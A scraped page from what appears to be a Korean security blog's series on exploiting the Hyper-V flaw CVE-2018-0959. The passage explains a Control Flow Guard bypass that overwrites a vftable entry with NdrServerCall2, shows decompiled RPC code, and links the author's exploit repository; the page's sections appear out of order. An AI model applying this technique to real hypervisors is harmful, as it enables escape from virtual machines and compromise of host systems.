&lt;h2 id=&#34;Trigger-Payload&#34;&gt;&lt;a href=&#34;#Trigger-Payload&#34; class=&#34;headerlink&#34; title=&#34;Trigger Payload&#34;&gt;&lt;/a&gt;Trigger Payload&lt;/h2&gt;&lt;p&gt;Exploit&amp;#xC744; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xBA74; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &amp;#xB178;&amp;#xB4DC;&amp;#xB4E4;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xB098; DLL &amp;#xC8FC;&amp;#xC18C; &amp;#xB4F1;&amp;#xC758; &amp;#xC815;&amp;#xBCF4;&amp;#xAC00; &amp;#xCD9C;&amp;#xB825;&amp;#xB418;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xBCFC; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. OOB Write&amp;#xB85C; &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xB97C; &amp;#xC4F0;&amp;#xB294; &amp;#xAC83;&amp;#xC774; &amp;#xB05D;&amp;#xB09C; &amp;#xB2E4;&amp;#xC74C; &amp;#xAC00;&amp;#xC0C1;&amp;#xBA38;&amp;#xC2E0;&amp;#xC744; &amp;#xC7AC;&amp;#xBD80;&amp;#xD305;&amp;#xD558;&amp;#xBA74; &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xAC00; &amp;#xC2E4;&amp;#xD589;&amp;#xB418;&amp;#xC5B4; &lt;code&gt;C:\User\Public&lt;/code&gt; &amp;#xBC11;&amp;#xC5D0; &amp;#xD30C;&amp;#xC77C;&amp;#xC774; &amp;#xC0DD;&amp;#xC131;&amp;#xB420; &amp;#xAC83;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;&lt;img src=&#34;/2023/10/30/pwndorei/newjeans-hyper-v-pt5/image8.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9;&amp;#xC73C;&amp;#xB85C; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787; &amp;#xC2DC;&amp;#xC5F0; &amp;#xC601;&amp;#xC0C1;&amp;#xC744; &amp;#xBCF4;&amp;#xC2DC;&amp;#xC8E0;!&lt;/p&gt;
&lt;h1 id=&#34;Exploit&#34;&gt;&lt;a href=&#34;#Exploit&#34; class=&#34;headerlink&#34; title=&#34;Exploit&#34;&gt;&lt;/a&gt;Exploit&lt;/h1&gt;&lt;iframe width=&#34;560&#34; height=&#34;315&#34; src=&#34;https://www.youtube.com/embed/LvtNtkAll84?si=VRM1u7HSuegWqPoW&#34; title=&#34;YouTube video player&#34; frameborder=&#34;0&#34; allow=&#34;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&#34; allowfullscreen&gt;&lt;/iframe&gt;

&lt;p&gt;&amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787; &amp;#xAD00;&amp;#xB828; &amp;#xCF54;&amp;#xB4DC;&amp;#xB4E4;&amp;#xC740; &lt;a href=&#34;https://github.com/pwndorei/CVE-2018-0959&#34;&gt;&amp;#xC5EC;&amp;#xAE30;&lt;/a&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xD655;&amp;#xC778;&amp;#xD558;&amp;#xC2E4; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h1 id=&#34;Part-6-&amp;#xC608;&amp;#xACE0;&#34;&gt;&lt;a href=&#34;#Part-6-&amp;#xC608;&amp;#xACE0;&#34; class=&#34;headerlink&#34; title=&#34;Part 6 &amp;#xC608;&amp;#xACE0;&#34;&gt;&lt;/a&gt;Part 6 &amp;#xC608;&amp;#xACE0;&lt;/h1&gt;&lt;p&gt;&amp;#xC774;&amp;#xB85C;&amp;#xC368; CVE-2018-0959&amp;#xC758; &amp;#xBD84;&amp;#xC11D;&amp;#xBD80;&amp;#xD130; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xAE4C;&amp;#xC9C0; &amp;#xBAA8;&amp;#xB450; &amp;#xC54C;&amp;#xC544;&amp;#xBCF4;&amp;#xC558;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;! &amp;#xD504;&amp;#xB85C;&amp;#xC81D;&amp;#xD2B8; &amp;#xCD08;&amp;#xCC3D;&amp;#xAE30;&amp;#xC5D0; Hyper-V &amp;#xC544;&amp;#xD0A4;&amp;#xD14D;&amp;#xCC98; &amp;#xACF5;&amp;#xBD80;&amp;#xD558;&amp;#xB358;&amp;#xAC8C; &amp;#xC5CA;&amp;#xADF8;&amp;#xC81C; &amp;#xAC19;&amp;#xC740;&amp;#xB370;&amp;#x2026; &amp;#xC815;&amp;#xB9D0; &amp;#xAE38;&amp;#xACE0; &amp;#xAE34; &amp;#xC5EC;&amp;#xC815;&amp;#xC774;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD558;&amp;#xC9C0;&amp;#xB9CC; &amp;#xC5EC;&amp;#xAE30;&amp;#xC11C; &amp;#xB05D;&amp;#xC774; &amp;#xC544;&amp;#xB2C8;&amp;#xC8E0;! &amp;#xB2E4;&amp;#xC74C; &amp;#xD30C;&amp;#xD2B8;&amp;#xBD80;&amp;#xD134; &amp;#xC800; &amp;#xB300;&amp;#xC2E0; L0ch&amp;#xB2D8;&amp;#xC774; CVE-2020-0917 &amp;#xBD84;&amp;#xC11D; &amp;#xAE00;&amp;#xB85C; &amp;#xB3CC;&amp;#xC544;&amp;#xC62C; &amp;#xC608;&amp;#xC815;&amp;#xC774;&amp;#xB2C8; &amp;#xB9CE;&amp;#xC740; &amp;#xAD00;&amp;#xC2EC; &amp;#xBD80;&amp;#xD0C1;&amp;#xB4DC;&amp;#xB9BD;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
 - hack &amp; life">
  <meta property="og:image" content="https://hackyboiz.github.io/2023/10/30/pwndorei/newjeans-hyper-v-pt5/index.png">
  <meta property="og:url" content="https://hackyboiz.github.io/">

  <link rel="canonical" href="https://hackyboiz.github.io/2023/10/30/pwndorei/newjeans-hyper-v-pt5/">

  <title>[Research] NewJeans&#39; Hyper-V Part 5 - CVE-2018-0959 Exploit(2) - hackyboiz</title>

  <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">


  <link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css">
  <link rel="stylesheet" href="/lib/hint/hint.min.css">

  
    
    <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css">
  

  


<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_6peoq002giu.css">
<link rel="stylesheet" href="/.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
<link rel="stylesheet" href="/.css">


<link rel="stylesheet" href="/css/main.css">

<!-- 自定义样式保持在最底部 -->


  <script src="/js/utils.js"></script>
  <script src="/js/color-schema.js"></script>

<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
</head>


<body>
  <header style="height: 40vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">&nbsp;<strong>Hackyboiz</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-addrcard"></i>
                About
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/author/">
                <i class="iconfont icon-user-fill"></i>
                Author
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner intro-2" id="background" parallax="true" style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="container page-header text-center fade-in-up">
            <span class="h2" id="subtitle">
              
            </span>

            
              
  <div class="mt-3 post-meta">
    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
    <time datetime="2023-10-30 17:00" pubdate>
      2023년 10월 30일 오후
    </time>
  </div>


<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      9.1k 자
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      181
       분
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2">
      <!--<script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
    </div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto" id="post">
            <!-- SEO header -->
            <h1 style="display: none">[Research] NewJeans&#39; Hyper-V Part 5 - CVE-2018-0959 Exploit(2)</h1>
                       
            <div class="markdown-body" id="post-body">
              <!-- <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
              <!-- hackyboiz_horizen_index -->
              <!--
              <ins class="adsbygoogle"
                   style="display:block"
                   data-ad-client="ca-pub-3672652207808168"
                   data-ad-slot="8887862313"
                   data-ad-format="auto"
                   data-full-width-responsive="true"></ins>
              <script>
                   (adsbygoogle = window.adsbygoogle || []).push({});
              </script>
              -->
              <p>&#xC9C0;&#xB09C; &#xD30C;&#xD2B8; &#xBCF4;&#xB7EC;&#xAC00;&#xAE30;<br><a href="https://hackyboiz.github.io/2023/09/30/pwndorei/newjeans-hyper-v-pt1/">[Research] NewJeans&#x2019; Hyper-V Part 1 - Hyper-V Architecture</a><br><a href="https://hackyboiz.github.io/2023/10/08/pwndorei/newjeans-hyper-v-pt2/">[Research] NewJeans&#x2019; Hyper-V Part 2 - CVE-2018-0959 Analysis(1)</a><br><a href="https://hackyboiz.github.io/2023/10/15/pwndorei/newjeans-hyper-v-pt3/">[Research] NewJeans&#x2019; Hyper-V Part 3 - CVE-2018-0959 Analysis(2)</a><br><a href="https://hackyboiz.github.io/2023/10/22/pwndorei/newjeans-hyper-v-pt4/">[Research] NewJeans&#x2019; Hyper-V Part 4 - CVE-2018-0959 Exploit(1)</a><br><strong>[Research] NewJeans&#x2019; Hyper-V Part 5 - CVE-2018-0959 Exploit(2) (Here)</strong></p>
<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694; &#xC2DC;&#xD5D8; &#xB05D;&#xB098;&#xC11C; &#xD589;&#xBCF5;&#xD55C; pwndorei&#xC785;&#xB2C8;&#xB2E4;.<br>&#xC9C0;&#xB09C; &#xD30C;&#xD2B8; 4&#xC5D0;&#xC11C; DLL&#xB4E4;&#xC758; &#xC8FC;&#xC18C;&#xC640; <code>VideoDirtListener</code>&#xB97C; &#xCC3E;&#xC544;&#xB0C8;&#xC5C8;&#xC8E0;? &#xD544;&#xC694;&#xD55C; &#xB370;&#xC774;&#xD130;&#xB294; &#xBAA8;&#xB450; &#xBAA8;&#xC600;&#xC73C;&#xB2C8; &#xC774;&#xC81C; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xC791;&#xC131;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;!</p>
<h1 id="Bypass-CFG"><a href="#Bypass-CFG" class="headerlink" title="Bypass CFG"></a>Bypass CFG</h1><p>Windows Server 2012 R2&#xC5D0;&#xC11C;&#xB294; ROP&#xB85C; CFG&#xB97C; &#xC6B0;&#xD68C;&#xD588;&#xC9C0;&#xB9CC; Windows 10 Version 1709&#xC5D0;&#xC11C;&#xB294; &#xBD88;&#xD589;&#xD558;&#xAC8C;&#xB3C4; OOB Read/Write&#xB85C; &#xC2A4;&#xD0DD;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026; &#xB530;&#xB77C;&#xC11C; &#xC870;&#xAE08; <del>&#xB9CE;&#xC774; &#xBCF5;&#xC7A1;&#xD558;&#xACE0;</del> &#xD2B9;&#xBCC4;&#xD55C; &#xBC29;&#xBC95;&#xC73C;&#xB85C; CFG&#xB97C; &#xC6B0;&#xD68C;&#xD560; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xC720;&#xCD9C;&#xD55C; DLL &#xC8FC;&#xC18C;&#xB4E4; &#xC911;&#xC5D0; <code>RPCRT4.dll</code>&#xC774; &#xC788;&#xAC74; &#xAC83;&#xC744; &#xAE30;&#xC5B5;&#xD558;&#xC2DC;&#xB098;&#xC694;?  &#xC774; RPC&#xB97C; &#xD65C;&#xC6A9;&#xD574;&#xC11C; CFG&#xB97C; &#xBB34;&#xB825;&#xD654;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC5D0; &#xB300;&#xD574; &#xC54C;&#xC544;&#xBD05;&#xC2DC;&#xB2E4;!</p>
<h2 id="Windows-RPC-Remote-Procedure-Call"><a href="#Windows-RPC-Remote-Procedure-Call" class="headerlink" title="Windows RPC(Remote Procedure Call)"></a>Windows RPC(Remote Procedure Call)</h2><p>Remote Procedure Call&#xC774;&#xB780; &#xC6D0;&#xACA9; &#xC11C;&#xBC84;&#xC5D0; &#xC788;&#xB294; &#xD504;&#xB85C;&#xC2DC;&#xC800;(&#xD568;&#xC218;)&#xB97C; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC5D0;&#xC11C; &#xB85C;&#xCEEC; &#xD568;&#xC218;&#xC778; &#xAC83;&#xCC98;&#xB7FC; &#xD638;&#xCD9C;&#xD574;&#xC11C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xD574;&#xC8FC;&#xB294; &#xAE30;&#xC220;&#xC785;&#xB2C8;&#xB2E4;.<br><img src="/2023/10/30/pwndorei/newjeans-hyper-v-pt5/image1.png" srcset="/img/loading.gif" alt></p>
<blockquote>
<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://learn.microsoft.com/ko-kr/windows/win32/rpc/how-rpc-works">&#xCD9C;&#xCC98;</a></p>
</blockquote>
<p>&#xC704; &#xADF8;&#xB9BC;&#xC740; Windows RPC&#xC758; &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xB97C; &#xB098;&#xD0C0;&#xB0B8; &#xADF8;&#xB9BC;&#xC785;&#xB2C8;&#xB2E4;. &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC640; &#xC11C;&#xBC84;&#xC758; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740; &#xD638;&#xCD9C;&#xC5D0; &#xC0AC;&#xC6A9;&#xB420; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB098; &#xD638;&#xCD9C;&#xC758; &#xBC18;&#xD658; &#xAC12;&#xC744; &#xADF8;&#xBCF4;&#xB2E4; &#xC544;&#xB798;&#xC5D0; &#xC788;&#xB294; Stub&#xC73C;&#xB85C; &#xC804;&#xB2EC;&#xD558;&#xACE0; Stub&#xC5D0;&#xC11C;&#xB294; &#xB370;&#xC774;&#xD130;&#xB97C; NDR(Network Data Representation)&#xD3EC;&#xB9F7;&#xC73C;&#xB85C; &#xBCC0;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.<br>&#xC0AC;&#xC2E4; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC5D0;&#xC11C; RPC&#xC758; &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xB294; &#xADF8;&#xB2E5; &#xC911;&#xC694;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4; &#x314E;&#x314E; &#xC11C;&#xBC84; &#xCE21;&#xC5D0;&#xC11C; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC758; &#xD638;&#xCD9C; &#xC694;&#xCCAD;&#xC744; &#xC5B4;&#xB5BB;&#xAC8C; &#xCC98;&#xB9AC;&#xD558;&#xB294;&#xC9C0;&#xB9CC; &#xC54C;&#xBA74; &#xCDA9;&#xBD84;&#xD558;&#xC8E0;. </p>
<h3 id="NdrServerCall2"><a href="#NdrServerCall2" class="headerlink" title="NdrServerCall2"></a><code>NdrServerCall2</code></h3><p><code>NdrServerCall2</code>&#xB294; &#xC11C;&#xBC84;&#xAC00; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC758; &#xC694;&#xCCAD;&#xC744; &#xC218;&#xC2E0;&#xD558;&#xBA74; &#xC774;&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xAE30; &#xC704;&#xD574; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xD568;&#xC218;&#xB85C; &#xC778;&#xC790;&#xC778; <code>pRpcMsg</code>&#xB294; &#xC694;&#xCCAD;&#xC758; &#xC815;&#xBCF4;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xACE0; &#xC788;&#xB294; <code>RPC_MESSAGE</code>&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xD3EC;&#xC778;&#xD130; &#xC785;&#xB2C8;&#xB2E4;.<br><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">void</span> __stdcall <span class="hljs-title">NdrServerCall2</span><span class="hljs-params">(PRPC_MESSAGE pRpcMsg)</span></span>
<span class="hljs-function"></span>{
	<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> pdwStubPhase;
	pdwStubPhase = <span class="hljs-number">0</span>;
	NdrStubCall2(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, pRpcMsg, &amp;pdwStubPhase);
}</code></pre><br>&#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; &#xD638;&#xCD9C;&#xD558;&#xB294; <code>NdrStubCall2</code>&#xC5D0;&#xC11C;&#xB294; <code>RPC_MESSAGE</code>&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xB420; &#xD568;&#xC218;&#xC640; &#xD638;&#xCD9C;&#xC5D0; &#xC0AC;&#xC6A9;&#xD560; &#xC778;&#xC790;&#xB97C; &#xD30C;&#xC2F1;&#xD558;&#xACE0; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.<br>&#xC774;&#xAC8C; CFG &#xC6B0;&#xD68C;&#xB791; &#xB300;&#xCCB4; &#xBB34;&#xC2A8; &#xC5F0;&#xAD00;&#xC774; &#xC788;&#xB294; &#xAC78;&#xAE4C;&#xC694;? <code>NdrServerCall2</code>&#xB294; <code>__stdcall</code> &#xD638;&#xCD9C; &#xADDC;&#xC57D;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC720;&#xC77C;&#xD55C; &#xC778;&#xC790;&#xC778; <code>pRpcMsg</code>&#xB294; <code>RCX</code>&#xB97C; &#xD1B5;&#xD574; &#xC804;&#xB2EC;&#xB429;&#xB2C8;&#xB2E4;. &#xD074;&#xB798;&#xC2A4;&#xC758; &#xBA54;&#xC18C;&#xB4DC;&#xC758; &#xD638;&#xCD9C; &#xADDC;&#xC57D;&#xC778; <code>thiscall</code>&#xC5D0;&#xC11C;&#xB294; &#xC774; <code>RCX</code>&#xC5D0; &#xAC1D;&#xCCB4;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xC804;&#xB2EC;&#xD558;&#xB294;&#xB370;&#xC694;? vftable&#xC744; &#xB36E;&#xC5B4;&#xC368;&#xC11C; &#xC6D0;&#xD558;&#xB294; &#xD568;&#xC218;&#xB85C; &#xC81C;&#xC5B4; &#xD750;&#xB984;&#xC744; &#xC62E;&#xAE38; &#xC218;&#xB294; &#xC788;&#xC9C0;&#xB9CC; &#xC778;&#xC790; &#xC804;&#xB2EC;&#xC740; &#xB9E4;&#xC6B0; &#xC81C;&#xD55C;&#xC801;&#xC785;&#xB2C8;&#xB2E4;.<br>&#xB530;&#xB77C;&#xC11C; <code>VideoDirtListener</code>&#xC758; vftable&#xC5D0;&#xC11C; &#xD2B9;&#xC815; &#xBA54;&#xC18C;&#xB4DC;&#xB97C; <code>RPCRT4!NdrServerCall2</code>&#xB85C; &#xB36E;&#xC5B4;&#xC4F0;&#xACE0; &#xD574;&#xB2F9; &#xBA54;&#xC18C;&#xB4DC;&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xBA74; <code>VideoDirtListener</code> &#xC790;&#xCCB4;&#xAC00; <code>RPC_MESSAGE</code>&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB85C; &#xC778;&#xC790;&#xB97C; &#xC804;&#xB2EC;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xB294; &#xC0C1;&#xD669;&#xC5D0;&#xC11C;&#xB3C4; &#xD638;&#xCD9C;&#xB420; &#xD568;&#xC218;&#xC640; &#xC0AC;&#xC6A9;&#xD560; &#xC778;&#xC790;&#xB97C; &#xC9C0;&#xC815;&#xD558;&#xB294; &#xAC83;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.<br>&#xC544;&#xB798;&#xB294; <code>RPC_MESSAGE</code>&#xC640; &#xAD00;&#xB828; &#xAD6C;&#xC870;&#xCCB4;&#xB4E4;&#xC758; &#xAD6C;&#xC870;&#xC785;&#xB2C8;&#xB2E4;<br><img src="/2023/10/30/pwndorei/newjeans-hyper-v-pt5/image2.png" srcset="/img/loading.gif" alt></p>
<blockquote>
<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://iamelli0t.github.io/2021/04/10/RPC-Bypass-CFG.html">&#xCD9C;&#xCC98;</a></p>
</blockquote>
<p>&#xC798; &#xD45C;&#xD604;&#xB41C; &#xADF8;&#xB9BC;&#xC774;&#xB77C; &#xAC00;&#xC838;&#xC654;&#xB294;&#xB370; x86&#xC774;&#xB124;&#xC694; &#x314B;&#x314B;&#x314B;&#x314B;&#x314B; &#xAC01; &#xAD6C;&#xC870;&#xCCB4; &#xBCC4;&#xB85C; &#xC911;&#xC694;&#xD55C; &#xD544;&#xB4DC;&#xC5D0; &#xB300;&#xD574; &#xC54C;&#xC544;&#xBCF4;&#xC2DC;&#xC8E0;</p>
<h4 id="RPC-MESSAGE"><a href="#RPC-MESSAGE" class="headerlink" title="RPC_MESSAGE"></a><code>RPC_MESSAGE</code></h4><ul>
<li>Buffer: &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC5D0; &#xC0AC;&#xC6A9;&#xB420; &#xC778;&#xC790;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xB294; &#xBC84;&#xD37C;</li>
<li>BufferLength: &#xBC84;&#xD37C;&#xC758; &#xAE38;&#xC774;</li>
<li>ProcNum: &#xD504;&#xB85C;&#xC2DC;&#xC800; &#xBC88;&#xD638;, DispatchTable&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xB420; &#xD568;&#xC218;&#xC758; &#xC778;&#xB371;&#xC2A4;</li>
<li>RpcInterfaceInformation: <code>RPC_SERVER_INTERFACE</code> &#xAD6C;&#xC870;&#xCCB4; &#xD3EC;&#xC778;&#xD130;<h4 id="RPC-SERVER-INTERFACE"><a href="#RPC-SERVER-INTERFACE" class="headerlink" title="RPC_SERVER_INTERFACE"></a><code>RPC_SERVER_INTERFACE</code></h4></li>
<li>InterpreterInfo: <code>MIDL_SERVER_INFO</code> &#xAD6C;&#xC870;&#xCCB4; &#xD3EC;&#xC778;&#xD130;<h4 id="MIDL-SERVER-INFO"><a href="#MIDL-SERVER-INFO" class="headerlink" title="MIDL_SERVER_INFO"></a><code>MIDL_SERVER_INFO</code></h4></li>
<li>pStubDesc: <code>MIDL_STUB_DESC</code> &#xAD6C;&#xC870;&#xCCB4; &#xD3EC;&#xC778;&#xD130;,</li>
<li>DispatchTable: &#xD568;&#xC218; &#xD14C;&#xC774;&#xBE14;</li>
<li>ProcString: &#xD504;&#xB85C;&#xC2DC;&#xC800; &#xD638;&#xCD9C;&#xC5D0; &#xD544;&#xC694;&#xD55C; &#xC815;&#xBCF4;(&#xD638;&#xCD9C;&#xC5D0; &#xC0AC;&#xC6A9;&#xB420; &#xC2A4;&#xD0DD; &#xD06C;&#xAE30;, &#xD30C;&#xB77C;&#xBBF8;&#xD130; &#xC218; &#xB4F1;)&#xC744; &#xC800;&#xC7A5;</li>
<li>FmtStringOffset: &#xD2B9;&#xC815; &#xD504;&#xB85C;&#xC2DC;&#xC800;&#xC758; &#xD638;&#xCD9C;&#xC5D0; &#xC0AC;&#xC6A9;&#xB420; ProcString &#xC624;&#xD504;&#xC14B;&#xC744; &#xC800;&#xC7A5;&#xD558;&#xB294; &#xBC30;&#xC5F4;</li>
</ul>
<p>&#xC5B4;&#xB5A4; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC5B4;&#xB5BB;&#xAC8C; &#xC804;&#xB2EC;&#xD574;&#xC57C; &#xC6D0;&#xD558;&#xB294; &#xD568;&#xC218;&#xAC00; &#xC62C;&#xBC14;&#xB974;&#xAC8C; &#xD638;&#xCD9C;&#xB418;&#xB294;&#xC9C0; &#xBD84;&#xC11D;&#xC744; &#xD1B5;&#xD574; &#xC54C;&#xC544;&#xBD05;&#xC2DC;&#xB2E4;!</p>
<h2 id="NdrStubCall2"><a href="#NdrStubCall2" class="headerlink" title="NdrStubCall2"></a><code>NdrStubCall2</code></h2><p>&#xB514;&#xCEF4;&#xD30C;&#xC77C;&#xB41C; &#xACB0;&#xACFC;&#xAC00; &#xB108;&#xBB34;&#x2026; &#xAE34; &#xAD00;&#xACC4;&#xB85C; &#xC544;&#xB798;&#xC758; &#xB2E4;&#xC12F; &#xB2E8;&#xACC4;&#xB85C; &#xB098;&#xB204;&#xC5B4; &#xC124;&#xBA85; &#xB4DC;&#xB9AC;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;</p>
<ol>
<li>Context Initialize(<code>MulNdrpInitializeContextFromProc</code>)</li>
<li>Server Initialize(<code>NdrpServerInit</code>)</li>
<li>Argument Parsing(<code>NdrpServerUnMarshal</code>)</li>
<li><code>Invoke</code></li>
<li><code>Exit</code></li>
</ol>
<h3 id="Context-Initialize"><a href="#Context-Initialize" class="headerlink" title="Context Initialize"></a>Context Initialize</h3><pre><code class="hljs C"><span class="hljs-function">nt __stdcall <span class="hljs-title">NdrStubCall2</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *pThis, <span class="hljs-keyword">void</span> *pChannel, PRPC_MESSAGE pRpcMsg, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *pdwStubPhase)</span></span>
<span class="hljs-function"></span>{
  pRpcMsga = pRpcMsg;
  v107 = pChannel;
  v101 = pRpcMsg;
  v108 = pdwStubPhase;
  memset_0(&amp;pStubMsg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(pStubMsg));
  v7 = <span class="hljs-number">0</span>i64;
  v97 = <span class="hljs-number">0</span>i64;
  v103 = <span class="hljs-number">0</span>;
  ProcNum = pRpcMsg-&gt;ProcNum;
  <span class="hljs-keyword">if</span> ( pThis )
  {
    ...
  }
  <span class="hljs-keyword">else</span>
  {
    MIDL = pRpcMsg-&gt;RpcInterfaceInformation-&gt;InterpreterInfo;
    MIDL2 = MIDL;
    DispatchTable = MIDL-&gt;DispatchTable;
  }
  MIDL_STUB_DESC = MIDL-&gt;pStubDesc;
  ProcNum2 = ProcNum;
  ProcString = (<span class="hljs-keyword">char</span> *)&amp;MIDL-&gt;ProcString[MIDL-&gt;FmtStringOffset[ProcNum]];
  MulNdrpInitializeContextFromProc(<span class="hljs-number">0x8A885D04</span>, ProcString, &amp;NdrProcContext, <span class="hljs-number">0</span>i64, <span class="hljs-number">0</span>);<span class="hljs-comment">//Context Initialize</span></code></pre>
